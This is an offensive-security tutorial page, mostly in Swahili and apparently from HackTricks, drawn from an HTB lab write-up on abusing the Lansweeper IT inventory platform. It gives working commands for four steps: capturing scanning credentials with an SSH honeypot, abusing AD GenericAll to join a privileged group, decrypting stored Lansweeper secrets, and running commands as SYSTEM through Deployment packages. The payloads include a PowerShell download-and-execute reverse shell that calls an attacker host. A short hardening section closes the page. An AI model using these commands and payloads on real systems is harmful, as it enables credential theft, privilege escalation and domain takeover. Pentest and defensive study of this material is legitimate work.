# Lansweeper Matumizi Mabaya: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ni jukwaa la ugundaji na inventory la IT linalotumika kwa kawaida kwenye Windows na limeunganishwa na Active Directory. Credentials zilizowekwa katika Lansweeper zimetumika na scanning engines zake kuthibitisha kwenye assets kupitia protocols kama SSH, SMB/WMI na WinRM. Misconfigurations mara nyingi huruhusu:

- Kukamata Credential kwa kuelekeza Scanning Target kwenye mwenyeji unaodhibitiwa na mshambuliaji (honeypot)
- Matumizi mabaya ya AD ACLs zilizofunguliwa na vikundi vinavyohusiana na Lansweeper ili kupata ufikiaji wa mbali
- On-host decryption ya Lansweeper-configured secrets (connection strings and stored scanning credentials)
- Code execution kwenye managed endpoints kupitia kipengele cha Deployment (mara nyingi running as SYSTEM)

Ukurasa huu unatoa muhtasari wa workflows za mshambuliaji na amri za kutumia tabia hizi wakati wa engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: unda Scanning Target inayorejea kwenye host yako na uifunganye na Scanning Credentials zilizopo. Wakati scan inapoendeshwa, Lansweeper itajaribu kuthibitisha kwa kutumia credentials hizo, na honeypot yako itazikamata.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Thibitisha creds zilizokamatwa dhidi ya huduma za DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Vidokezo
- Inafanya kazi kwa njia sawa kwa itifaki nyingine wakati unaweza kulazimisha scanner kuunganishwa na listener yako (SMB/WinRM honeypots, n.k.). SSH mara nyingi ni rahisi zaidi.
- Scanners wengi hujitambulisha kwa client banners za kipekee (mf., RebexSSH) na zitajaribu amri zisizo hatari (uname, whoami, n.k.).

## 2) AD ACL abuse: pata ufikia wa mbali kwa kujiongeza mwenyewe kwenye app-admin group

Tumia BloodHound kuorodhesha effective rights kutoka kwa akaunti iliyovamiwa. Matokeo ya kawaida ni kikundi maalum cha scanner au app (mf., “Lansweeper Discovery”) kinachoshikilia GenericAll juu ya kikundi lenye mamlaka (mf., “Lansweeper Admins”). Ikiwa kikundi lenye mamlaka pia ni mjumbe wa “Remote Management Users”, WinRM inapatikana mara tu tunapojiongeza.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll kwenye kundi kwa kutumia BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kisha pata interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kidokezo: Operesheni za Kerberos zinategemea muda. Ikiwa unapokea KRB_AP_ERR_SKEW, linganisha saa na DC kwanza:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Fungua siri zilizowekwa na Lansweeper kwenye mwenyeji

Kwenye server ya Lansweeper, tovuti ya ASP.NET kawaida huhifadhi encrypted connection string na symmetric key inayotumika na application. Kwa upatikanaji wa ndani unaofaa, unaweza dekripti connection string ya DB kisha kutoa credentials zilizohifadhiwa za scanning.

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Tumia SharpLansweeperDecrypt kuendesha decryption na kutupa credentials zilizohifadhiwa:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Matokeo yanayotarajiwa yanajumuisha DB connection details na plaintext scanning credentials kama vile Windows na Linux accounts zinazotumika katika estate. Hizi mara nyingi zina elevated local rights kwenye domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Tumia recovered Windows scanning creds kwa ufikiaji wa ruhusa za juu:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kama mwanachama wa “Lansweeper Admins”, UI ya wavuti inaonyesha Deployment na Configuration. Chini ya Deployment → Deployment packages, unaweza kuunda packages ambazo zinaendesha amri yoyote kwenye vifaa vilivyolengwa. Utekelezaji hufanywa na service ya Lansweeper kwa ruhusa za juu, ukileta code execution kama NT AUTHORITY\SYSTEM kwenye host iliyochaguliwa.

High-level steps:
- Tengeneza package mpya ya Deployment inayotekeleza PowerShell au cmd one-liner (reverse shell, add-user, n.k.).
- Lenga kifaa kinachotakiwa (mf., DC/host ambapo Lansweeper inaendesha) kisha bonyeza Deploy/Run now.
- Pata shell yako kama SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Vitendo vya deployment huwa vinasikika na kuacha logs ndani ya Lansweeper na Windows event logs. Tumia kwa tahadhari.

## Ugunduzi na kuimarisha usalama

- Zuia au ondoa anonymous SMB enumerations. Simamia RID cycling na ufikiaji usio wa kawaida wa Lansweeper shares.
- Egress controls: zuia au punguza sana outbound SSH/SMB/WinRM kutoka scanner hosts. Taarifu kwa ports zisizo za kawaida (mf., 2022) na client banners zisizo za kawaida kama Rebex.
- Linda `Website\\web.config` na `Key\\Encryption.txt`. Hamisha siri (externalize) ndani ya vault na zungusha (rotate) pale zinapofichuliwa. Fikiria service accounts zenye ruhusa ndogo na gMSA pale inapowezekana.
- AD monitoring: toa tahadhari kuhusu mabadiliko kwa makundi yanayohusiana na Lansweeper (mf., “Lansweeper Admins”, “Remote Management Users”) na kwa mabadiliko ya ACL yanayotoa GenericAll/Write uanachama kwa makundi yenye ruhusa za juu.
- Fanya ukaguzi wa utengenezaji/mabadiliko/utekelezaji wa Deployment packages; toa tahadhari kwa packages zinazozindua cmd.exe/powershell.exe au kuanzisha muunganisho wa outbound usiotarajiwa.

## Mada zinazohusiana
- SMB/LSA/SAMR enumeration na RID cycling
- Kerberos password spraying na mambo ya kuzingatia kuhusu clock skew
- BloodHound path analysis ya application-admin groups
- WinRM usage na lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
